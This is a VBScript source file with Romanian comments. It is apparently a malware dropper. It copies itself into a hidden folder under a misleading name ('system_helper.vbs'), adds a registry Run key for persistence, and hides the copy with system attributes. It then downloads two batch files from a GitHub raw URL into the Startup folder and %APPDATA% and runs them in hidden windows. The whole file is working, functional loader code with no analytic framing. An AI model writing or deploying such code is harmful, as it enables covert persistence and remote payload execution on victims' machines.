Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Căi importante
startupPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\file2.bat"
targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"
scriptPath = WScript.ScriptFullName

' Crează folderul Contacts\zo dacă nu există
If Not fso.FolderExists(targetFolder) Then
    fso.CreateFolder(targetFolder)
End If

' Copiază scriptul actual în folderul Contacts\zo pentru persistență
hiddenScriptPath = targetFolder & "\system_helper.vbs"
If Not fso.FileExists(hiddenScriptPath) Then
    fso.CopyFile scriptPath, hiddenScriptPath
End If

' Adaugă la registru pentru a rula automat la pornire
registryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
shell.RegWrite registryPath & "SystemHelper", "wscript.exe //B """ & hiddenScriptPath & """", "REG_SZ"

' Ascunde fișierul copiat
shell.Run "cmd /c attrib +H +S """ & hiddenScriptPath & """", 0, True

' Descarcă start.bat în folderul Startup
DownloadFile "https://raw.githubusercontent.com/MoViper2244/VIPER2/main/start.bat", startupPath

' Descarcă file2.bat în %APPDATA%
DownloadFile "https://raw.githubusercontent.com/MoViper2244/VIPER2/main/file2.bat", appDataPath

' Rulează start.bat (ascuns)
shell.Run "cmd /c """ & startupPath & """", 0, False

' Așteaptă și rulează file2.bat
WScript.Sleep 5000
shell.Run "cmd /c """ & appDataPath & """", 0, False

' Funcție pentru descărcare fișiere
Function DownloadFile(url, filePath)
    On Error Resume Next
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlHttp.Open "GET", url, False
    xmlHttp.Send
    
    If xmlHttp.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write xmlHttp.ResponseBody
        stream.SaveToFile filePath, 2
        stream.Close
    End If
End Function
